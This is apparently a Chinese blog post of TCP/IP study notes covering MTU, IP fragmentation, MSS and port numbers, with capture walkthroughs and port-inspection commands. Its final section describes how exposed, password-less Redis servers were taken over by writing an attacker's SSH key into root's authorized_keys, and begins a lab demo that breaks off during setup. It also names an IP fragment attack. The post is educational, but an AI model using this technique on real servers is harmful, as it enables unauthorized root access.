<p>下图是以太网的帧格式，以太网的帧最小的帧是 64 字节，除去 14 字节头部和 4 字节 CRC 字段，有效荷载最小为 46 字节。最大的帧是 1518 字节，除去 14 字节头部和 4 字节 CRC，有效荷载最大为 1500，这个值就是以太网的 <code>MTU</code>。因此如果传输 <code>100KB </code>的数据，至少需要 （100 * 1024 / 1500) = 69 个以太网帧。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/29.jpg"></p>
<p>不同的数据链路层的 MTU 是不同的。通过<code>netstat -i </code>可以查看网卡的 mtu，比如在 我的 centos 机器上可以看到</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/30.jpg"></p>
<h3 id="IP-分段"><a href="#IP-分段" class="headerlink" title="IP 分段"></a>IP 分段</h3><p>IPv4 数据报的最大大小为 <code>65535</code> 字节，这已经远远超过了以太网的 <code>MTU</code>，而且有些网络还会开启巨帧（Jumbo Frame）能达到 9000 字节。 当一个 IP 数据包<code>大于</code> MTU 时，IP 会把数据报文进行<code>切割</code>为多个<code>小的片段</code>(小于 MTU），使得这些小的报文可以通过链路层进行传输</p>
<p>IP 头部中有一个表示<code>分片偏移量</code>的字段，用来表示<code>该分段在原始数据报文中的位置</code>，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/31.jpg"></p>
<p>下面我们 wireshark 来演示 IP 分段，wireshark 开启抓包，在命令行中执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ping -s 3000 www.baidu.com</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">PING www.a.shifen.com (14.215.177.39): 3000 data bytes</span><br><span class="line">Request timeout for icmp_seq 0</span><br><span class="line">Request timeout for icmp_seq 1</span><br><span class="line">Request timeout for icmp_seq 2</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/32.jpg"></p>
<p>通过<code>man ping</code>命令可以看到<code>ping -s</code>命令会增加 8byte 的 ICMP 头，所以<code>ping -s 3000</code> IP 层实际会发送 3008 字节。</p>
<p>先看第一个包</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/33.jpg"></p>
<p>这个包是 IP 分段包的第一个分片，<code>More fragments: Set</code>表示这个包是 IP 分段包的一部分，还有其它的分片包，<code>Fragment offset: 0</code>表示分片偏移量为 0，IP 包的 payload 的大小为 1480，加上 20 字节的头部正好是 1500</p>
<p>第二个包的详情截图如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/34.jpg"></p>
<p>同样<code>More fragments</code>处于 set 状态，表示后面还有其它分片，<code>Fragment offset: 185</code>这里并不是表示分片偏移量为 185，wireshark 这里显示的时候除以了 8，真实的分片偏移量为 185 * 8 = 1480</p>
<p>第三个包的详情截图如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/35.jpg"></p>
<p>可以看到<code>More fragments</code>处于 Not set 状态，表示这是最后一个分片了。<code>Fragment offset: 370</code>表示偏移量为 370 * 8 = 2960，包的大小为 68 - 20（IP 头部大小） = 48</p>
<p>三个分片如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/36.jpg"></p>
<p>前面我们提到 IP 协议不会对丢包进行重传，那么 IP 分段中有<code>分片丢失、损坏</code>的话，会发生什么呢？ 这种情况下，目标主机将没有办法将分段的数据包重组为一个完整的数据包，<code>依赖于传输层是否进行重传</code>。</p>
<p>利用 IP 包分片的策略，有一种对应的网络攻击方式<code>IP fragment attack</code>，就是一直传<code>More fragments = 1</code>的包，导致接收方一直缓存分片，从而可能导致接收方内存耗尽。</p>
<h3 id="网络中的木桶效应：路径-MTU"><a href="#网络中的木桶效应：路径-MTU" class="headerlink" title="网络中的木桶效应：路径 MTU"></a>网络中的木桶效应：路径 MTU</h3><p>一个包从发送端传输到接收端，中间要跨越很多个网络，每条链路的 MTU 都可能不一样，这个通信过程中<code>最小的 MTU</code> 称为「路径 MTU（Path MTU）」。就好比开车有时候开的是双向 4 车道，有时候可能是乡间小路一样。</p>
<p>比如下图中，第一段链路 MTU 大小为 1500 字节，第二段链路 MTU 为 800 字节，第三段链路 MTU 为 1200 字节，则<code>路径 MTU</code> 为三段 MTU 的最小值 800。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/37.jpg"></p>
<p>路径 MTU 就跟<code>木桶效应</code>是一个道理，木桶的盛水量由最短的那条短板决定，路径 MTU 也是由通信链条中<code>最小的 MTU </code>决定。</p>
<h3 id="实际模拟路径-MTU-发现"><a href="#实际模拟路径-MTU-发现" class="headerlink" title="实际模拟路径 MTU 发现"></a>实际模拟路径 MTU 发现</h3><p>用下面的代码可以用来测试路径 MTU 发现，为了方便，每行前面加了行号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0.000 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) &#x3D; 0</span><br><span class="line">0.000 bind(3, ..., ...) &#x3D; 0</span><br><span class="line">0.000 listen(3, 1) &#x3D; 0</span><br><span class="line"></span><br><span class="line">0.100 &lt; S 0:0(0) win 32792 &lt;mss 1460,nop,wscale 7&gt;</span><br><span class="line">0.100 &gt; S. 0:0(0) ack 1 &lt;mss 1460,nop,wscale 7&gt;</span><br><span class="line">0.200 &lt; . 1:1(0) ack 1 win 257</span><br><span class="line">0.200 accept(3, ..., ...) &#x3D; 4</span><br><span class="line">&#x2F;&#x2F; 至此三次握手，相关初始化完成</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 发送第一个数据包</span><br><span class="line">+0.2 write(4, ..., 1460) &#x3D; 1460</span><br><span class="line">&#x2F;&#x2F; 断言内核会发送 1460 大小的数据包出来</span><br><span class="line">+0.0 &gt; P. 1:1461(1460) ack 1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 发送 ICMP 错误报文，告知包太大, 需要分片</span><br><span class="line">+0.01 &lt; icmp unreachable frag_needed mtu 1200 [1:1461(1460)]</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TCP 立马选择对方告知的较小 MTU 计算自己的 MSS，重发此包</span><br><span class="line">+.0 &gt; . 1:1161(1160) ack 1</span><br><span class="line">+0.0&gt; P. 1161:1461(300) ack 1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 确认所有的数据</span><br><span class="line">+0.1 &lt; . 1:1(0) ack 1461 win 257</span><br><span class="line"></span><br><span class="line">+0 &#96;sleep 1000000&#96;</span><br></pre></td></tr></table></figure>
<p>其中在发送了 1460 大小的数据以后，这第一个数据包在 IP 层设置了<code>不分段</code>，之后收到一个 <code>ICMP </code>告知的报文过大错误</p>
<p>运行抓包如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/38.jpg"></p>
<p>●1 ~ 3：三次握手</p>
<p>●4：发送长度为 1460 的数据，这个数据包设置了不允许分片<code>Don&#39;t fragment: Set</code></p>
<p>●5：发送端收到 <code>ICMP </code>包，告知包太大需要分片，下一个分片的大小按照 <code>MTU=1200</code> 来计算</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/39.jpg"></p>
<p>●6：TCP 为了避免底层分片立刻拆包重发数据包，这次包大小为 1200 - 40 = 1160</p>
<p>●：发送端发送剩下的 300 字节（1460 - 1160）</p>
<p>●8：确认所有的数据</p>
<p>整个过程如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/40.jpg"></p>
<p>因为有 <code>MTU</code> 的存在，TCP 每次发包的大小也限制了，这就是下面要介绍的 <code>MSS</code>。</p>
<h3 id="TCP-最大段大小（Max-Segment-Size，MSS）"><a href="#TCP-最大段大小（Max-Segment-Size，MSS）" class="headerlink" title="TCP 最大段大小（Max Segment Size，MSS）"></a>TCP 最大段大小（Max Segment Size，MSS）</h3><p><code>TCP</code> 为了避免被发送方分片，会主动把数据分割成小段再交给网络层，最大的分段大小称之为 <code>MSS</code>（Max Segment Size）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSS &#x3D; MTU - IP header头大小 - TCP 头大小</span><br></pre></td></tr></table></figure>
<p>这样一个 MSS 的数据恰好能装进一个 MTU 而不用分片。</p>
<p>在以太网中 TCP 的 MSS = 1500（MTU） - 20（IP 头大小） - 20（TCP 头大小）= 1460</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/41.jpg"></p>
<p>我们来抓一个包来实际看一下，下面是下载一个 png 图片的 http 请求包 当三次握手建立一个 TCP 连接时，通信的双方会在 SYN 报文里说明自己允许的最大段大小。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/42.jpg"></p>
<p>可以看到 TCP 的包体数据大小为 1448，因为TCP 头部里包含了 12 字节的选项（Options）字段，头部大小从之前的 20 字节变为了 32 字节，所以 TCP 包体大小变为了：1500（以太网 MTU） - 20（IP 固定表头大小） - 20（TCP 固定表头大小） - 12（TCP 表头选项） = 1448</p>
<h3 id="为什么有时候抓包看到的单个数据包大于-MTU"><a href="#为什么有时候抓包看到的单个数据包大于-MTU" class="headerlink" title="为什么有时候抓包看到的单个数据包大于 MTU"></a>为什么有时候抓包看到的单个数据包大于 MTU</h3><p>…</p>
<p>TSO（<code>TCP Segment Offload</code>） 特性是指由网卡代替 CPU 实现 packet 的分段和合并，节省系统资源，因此 TCP 可以抓到超过 MTU 的包，但是不是真正传输的单个包会超过链路的 MTU。</p>
<h3 id="TCP-套接字选项-TCP-MAXSEG"><a href="#TCP-套接字选项-TCP-MAXSEG" class="headerlink" title="TCP 套接字选项 TCP_MAXSEG"></a>TCP 套接字选项 TCP_MAXSEG</h3><p>TCP 有一个 socket 选项<code>TCP_MAXSEG</code>，可以用来设置此次连接的 <code>MSS</code>，如果设置了这个选项，则 <code>MSS</code> 不能超过这个值。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><code>IP 数据包</code>长度在超过链路的 <code>MTU</code> 时在发送之前需要<code>分片</code>，而 <code>TCP 层</code>为了 IP 层不用分片主动将包切割成<code> MSS</code> 大小。</p>
<h3 id="作业题-1"><a href="#作业题-1" class="headerlink" title="作业题"></a>作业题</h3><p>1、TCP/IP 协议中，MSS 和 MTU 分别工作在哪一层？</p>
<p>TCP层,IP层。</p>
<p>2、在 MTU=1500 字节的以太网中，TCP 报文的最大载荷为多少字节？</p>
<p>1460 = 1500 - 20(IP header) - 20(TCP header,不包括可变大小40:option&amp;padding)</p>
<h2 id="繁忙的贸易港口-——-聊聊端口号"><a href="#繁忙的贸易港口-——-聊聊端口号" class="headerlink" title="繁忙的贸易港口 —— 聊聊端口号"></a>繁忙的贸易港口 —— 聊聊端口号</h2><p>分层结构中每一层都有一个唯一标识，比如链路层的 <code>MAC 地址</code>，IP 层的 <code>IP 地址</code>，传输层是用<code>端口号</code>。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/43.jpg"></p>
<p>TCP 用两字节的整数来表示端口，一台主机最大允许 65536 个端口号的。TCP 首部中端口号如下图黄色高亮部分。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/44.jpg"></p>
<p>如果把 ip 地址比作一间房子，端口就是出入这间房子的门。房子一般只有几个门，但是一台主机端口最多可以有 65536 个。</p>
<p>有了 IP 协议，数据包可以顺利的被传输到对应 IP 地址的主机，当主机收到一个数据包时，应该把这个数据包交给哪个应用程序进行处理呢？这台主机可能运行多个应用程序，比如处理 HTTP 请求的 web 服务器 Nginx，Redis 服务器， 读写 MySQL 服务器的客户端等。</p>
<p>传输层就是用端口号来区分同一个主机上不同的应用程序的。操作系统为有需要的进程分配端口号，当目标主机收到数据包以后，会根据数据报文首部的目标端口号将数据发送到对应端口的进程。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/45.jpg"></p>
<p>主动发起的客户端进程也需要开启端口，会把自己的端口放在首部的源端口（source port）字段中，以便对方知道要把数据回复给谁。</p>
<h3 id="端口号分类"><a href="#端口号分类" class="headerlink" title="端口号分类"></a>端口号分类</h3><p>端口号被划分成以下 3 种类型：</p>
<p>1.熟知端口号（well-known port）<br>2.已登记的端口（registered port）<br>3.临时端口号（ephemeral port）  </p>
<h4 id="熟知端口号（well-known-port）"><a href="#熟知端口号（well-known-port）" class="headerlink" title="熟知端口号（well-known port）"></a>熟知端口号（well-known port）</h4><p>熟知端口号由专门的机构由 IANA 分配和控制，范围为 <code>0~1023</code>。为了能让客户端能随时找到自己，服务端程序的端口必须要是固定的。很多熟知端口号已经被用就分配给了特定的应用，比如 HTTP 使用 <code>80</code>端口，HTTPS 使用 <code>443</code> 端口，ssh 使用 <code>22</code> 端口。 访问百度<code>http://www.baidu.com/</code>，其实就是向百度服务器之一（163.177.151.110）的 80 端口发起请求，<code>curl -v http://www.baidu.com/</code>抓包结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">20:12:32.336962 IP 10.211.55.10.39438 &gt; 163.177.151.110.80: Flags [S], seq 2171375522, win 29200, options [mss 1460,sackOK,TS val 346956173 ecr 0,nop,wscale 7], length 0</span><br><span class="line">20:12:32.373834 IP 163.177.151.110.80 &gt; 10.211.55.10.39438: Flags [S.], seq 3304042876, ack 2171375523, win 32768, options [mss 1460,wscale 1,nop], length 0</span><br><span class="line">20:12:32.373948 IP 10.211.55.10.39438 &gt; 163.177.151.110.80: Flags [.], ack 1, win 229, length 0</span><br><span class="line">20:12:32.374290 IP 10.211.55.10.39438 &gt; 163.177.151.110.80: Flags [P.], seq 1:78, ack 1, win 229, length 77</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br></pre></td></tr></table></figure>
<p>在 Linux 上，如果你想监听这些端口需要 Root 权限，为的就是这些熟知端口不被普通的用户进程占用，防止某些普通用户实现恶意程序（比如伪造 ssh 监听 22 端口）来获取敏感信息。熟知端口也被称为<code>保留端口</code>。</p>
<h4 id="已登记的端口（registered-port）"><a href="#已登记的端口（registered-port）" class="headerlink" title="已登记的端口（registered port）"></a>已登记的端口（registered port）</h4><p>已登记的端口不受 IANA 控制，不过由 IANA 登记并提供它们的使用情况清单。它的范围为 <code>1024～49151</code>。</p>
<p>为什么是 49151 这样一个魔数？ 其实是取的端口号最大值 <code>65536</code> 的 3/4 减 1 （<code>49151</code> = 65536 * 0.75 - 1）。可以看到已登记的端口占用了大约 75% 端口号的范围。</p>
<p>已登记的端口常见的端口号有：</p>
<p>1.MySQL：<code>3306</code><br>2.Redis：<code>6379</code><br>3.MongoDB：<code>27017</code></p>
<h4 id="临时端口号（ephemeral-port）"><a href="#临时端口号（ephemeral-port）" class="headerlink" title="临时端口号（ephemeral port）"></a>临时端口号（ephemeral port）</h4><p>如果应用程序没有调用 bind() 函数将 socket 绑定到特定的端口上，那么 <code>TCP 和 UDP 会为该 socket 分配一个唯一的临时端口</code>。IANA 将 49152～65535 范围的端口称为临时端口（ephemeral port）或动态端口（dynamic port），也称为私有端口（private port），这些端口可供本地应用程序临时分配端口使用。</p>
<p>不同的操作系统实现会选择不同的范围分配临时端口，在 Linux 上能分配的端口范围由 /proc/sys/net/ipv4/ip_local_port_range 变量决定，一般 Linux 内核端口范围为 32768~60999</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range                                      </span><br><span class="line">32768 	60999</span><br></pre></td></tr></table></figure>
<p>在需要主动发起大量连接的服务器上（比如网络爬虫、正向代理）可以调整 <code>ip_local_port_range</code> 的值，允许更多的可用端口。</p>
<h3 id="端口相关的命令"><a href="#端口相关的命令" class="headerlink" title="端口相关的命令"></a>端口相关的命令</h3><h4 id="如何查看对方端口是否打开"><a href="#如何查看对方端口是否打开" class="headerlink" title="如何查看对方端口是否打开"></a>如何查看对方端口是否打开</h4><p>使用 <code>nc</code> 和 <code>telnet</code> 这两个命令可以非常方便的查看到对方端口是否打开或者网络是否可达，比如查看 <code>10.211.55.12</code> 机器的 <code>6379</code> 端口是否打开可以使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.211.55.12 6379                                                                                                                                     </span><br><span class="line">Trying 10.211.55.12...</span><br><span class="line">Connected to 10.211.55.12.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -v  10.211.55.12 6379                                                                                                                                    </span><br><span class="line">Ncat: Connected to 10.211.55.12:6379</span><br></pre></td></tr></table></figure>
<p>如果对端端口没有打开，会发生什么呢？比如 <code>10.211.55.12</code> 的<code>6380</code> 端口没有打开，使用 <code>telnet</code> 和 <code>nc</code> 命令会出现 “Connection refused” 错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">telnet  10.211.55.12 6380                                                                                                                                     </span><br><span class="line">Trying 10.211.55.12...</span><br><span class="line">telnet: connect to address 10.211.55.12: Connection refused</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -v  10.211.55.12 6380 </span><br></pre></td></tr></table></figure>
<h4 id="如何查看端口被什么进程监听占用"><a href="#如何查看端口被什么进程监听占用" class="headerlink" title="如何查看端口被什么进程监听占用"></a>如何查看端口被什么进程监听占用</h4><p>比如查看 22 端口被谁占用，常见的可以使用 <code>lsof</code> 和 <code>netstat</code> 两种方法</p>
<h5 id="第一种方法：使用-netstat"><a href="#第一种方法：使用-netstat" class="headerlink" title="第一种方法：使用 netstat"></a>第一种方法：使用 netstat</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -ltpn | grep :22</span><br></pre></td></tr></table></figure>
<h5 id="第二种方法：使用-lsof"><a href="#第二种方法：使用-lsof" class="headerlink" title="第二种方法：使用 lsof"></a>第二种方法：使用 lsof</h5><p>因为在 linux 上一切皆文件，TCP socket 连接也是一个 fd。因此使用 lsof 也可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -n -P -i:22</span><br></pre></td></tr></table></figure>
<p>其中 <code>-n</code> 表示不将 IP 转换为 hostname，<code>-P</code> 表示不将 port number 转换为 service name，<code>-i:port</code> 表示端口号为 22 的进程</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/46.jpg"></p>
<p>可以看到 22 端口被进程号为 1333 的 sshd 进程监听</p>
<p>反过来，如何查看进程监听或者打开了哪些端口呢？</p>
<h4 id="如何查看进程监听的端口号"><a href="#如何查看进程监听的端口号" class="headerlink" title="如何查看进程监听的端口号"></a>如何查看进程监听的端口号</h4><p>还是以 sshd 为例，先用<code>ps -ef | grep sshd </code>找到 sshd 的进程号，这里为 1333</p>
<h5 id="第一种方法：使用-netstat-1"><a href="#第一种方法：使用-netstat-1" class="headerlink" title="第一种方法：使用 netstat"></a>第一种方法：使用 netstat</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -atpn | grep 1333</span><br></pre></td></tr></table></figure>
<h5 id="第二种方法：使用-lsof-1"><a href="#第二种方法：使用-lsof-1" class="headerlink" title="第二种方法：使用 lsof"></a>第二种方法：使用 lsof</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -n -P -p 1333 | grep TCP</span><br></pre></td></tr></table></figure>
<h5 id="第三种方法奇技淫巧：-proc-pid"><a href="#第三种方法奇技淫巧：-proc-pid" class="headerlink" title="第三种方法奇技淫巧：/proc/pid"></a>第三种方法奇技淫巧：/proc/pid</h5><h3 id="利用端口进行网络攻击"><a href="#利用端口进行网络攻击" class="headerlink" title="利用端口进行网络攻击"></a>利用端口进行网络攻击</h3><p>路千万条，安全第一条。暴露不合理，运维两行泪。</p>
<p>把本来应该是内网或本机调用的服务端口暴露到公网是极其危险的事情，比如之前 2015 年很多 Redis 服务器遭受到了攻击，方法正是利用了暴露在公网的 Redis 端口进行入侵系统。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/47.jpg"></p>
<p>它的原理是利用了不需要密码登录的 redis，清空 redis 数据库后写入他自己的 ssh 登录公钥，然后将redis数据库备份为 /root/.ssh/authotrized_keys。 这就成功地将自己的公钥写入到 .ssh 的 authotrized_keys，无需密码直接 root 登录被黑的主机。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/48.jpg"></p>
<p>下面我们来演示一个以 root 权限运行的 redis 服务器是怎么被黑的。</p>
<p>场景：一台 ip 为 10.211.55.12（我的一台 Centos7 虚拟机）的 6379 端口对外暴露端口。首先尝试登录，发现需要输入密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.211.55.12</span><br><span class="line">root@10.211.55.12&#39;s password:</span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
<p>切换到 root 用户 1、下载解压 Redis 3.0 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;codeload.github.com&#x2F;antirez&#x2F;redis&#x2F;zip&#x2F;3.0</span><br><span class="line">unzip 3.0</span><br></pre></td></tr></table></figure>
<p>2、编译 redis</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd redis-3.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>3、运行 redis 服务器，不出意外，redis 服务器就启动起来了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">.&#x2F;redis-server</span><br></pre></td></tr></table></figure>
<p>执行 netstat</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -ltpn | grep 6379</span><br></pre></td></tr></table></figure>
